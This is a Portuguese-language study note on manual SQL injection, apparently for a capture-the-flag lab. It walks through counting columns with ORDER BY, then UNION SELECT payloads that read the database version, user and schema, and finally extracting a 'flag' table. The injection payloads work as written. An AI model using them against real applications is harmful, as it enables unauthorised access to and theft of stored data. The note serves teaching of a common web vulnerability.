[[11 - VULN - SQL Injection Manual]]


## Fase 1: Descobrir a quantidade de colunas

A primeira etapa de um ataque de SQL Injection é identificar **quantas colunas** estão sendo selecionadas pelo back-end. Isso é necessário para usar a técnica `UNION SELECT`.

### Exemplo:

```sql
SELECT name, description FROM products ORDER BY 1;
SELECT name, description FROM products ORDER BY 2;
```

O atacante vai testando:

```sql
' ORDER BY 1; --
' ORDER BY 2; --
' ORDER BY 3; -- (se der erro, só existem 2 colunas)
```

---

## Fase 2: Usando UNION SELECT

Depois de saber o número de colunas, o atacante pode usar `UNION SELECT` para **inserir dados falsos** ou **extrair informações sensíveis** do banco.

```sql
SELECT name, description 
FROM products 
WHERE name LIKE '%teste%' 
UNION SELECT 1, 2;
```

Isso vai "juntar" um novo resultado à consulta original, com valores `1` e `2` nas colunas correspondentes.

### Exemplo de ataque direto:

```sql
' UNION SELECT 1,2,3,4;# 
```

Com isso, ele força o banco a retornar um **novo "produto falso"** com os valores `1`, `2`, `3`, `4`.

### Agora vamos explorar a vulnerabilidade...

Sabendo que a **coluna 2** exibe o nome do produto (ou outro campo visível), o atacante pode extrair informações do sistema:

```sql
' UNION SELECT 1, @@version, 3, 4;#     -- versão do banco
' UNION SELECT 1, database(), 3, 4;#    -- nome do banco atual
' UNION SELECT 1, user(), 3, 4;#        -- usuário do banco
```

Essas informações são **sensíveis** e ajudam o atacante a mapear o ambiente.

---

## Fase 3: Explorando a estrutura do banco

### Descobrindo tabelas dentro do banco:

```sql
' UNION SELECT 1, table_name, 3, 4 
FROM information_schema.tables 
WHERE table_schema = 'cs';#
```

Suponha que ele descobre duas tabelas:

- `products`
    
- `flag`
    

### Descobrindo colunas da tabela `products`:

```sql
' UNION SELECT 1, column_name, 3, 4 
FROM information_schema.columns 
WHERE table_name = 'products';#
```

Retorno:

```
products → ID, NAME, DESCRIPTION, PRICE
```

### Descobrindo colunas da tabela `flag`:

```sql
' UNION SELECT 1, column_name, 3, 4 
FROM information_schema.columns 
WHERE table_name = 'flag';#
```

Retorno:

```
flag → ID, NAME
```

---

## Fase 4: Extraindo dados sigilosos

Agora que sabemos os nomes das tabelas e colunas, podemos montar um `UNION SELECT` para **extrair os dados diretamente**:

```sql
' OR 1=1 UNION SELECT 1, id, name, 4 FROM flag;#
```

> Isso traria os dados da tabela `flag` diretamente para o campo que exibe os produtos no site.


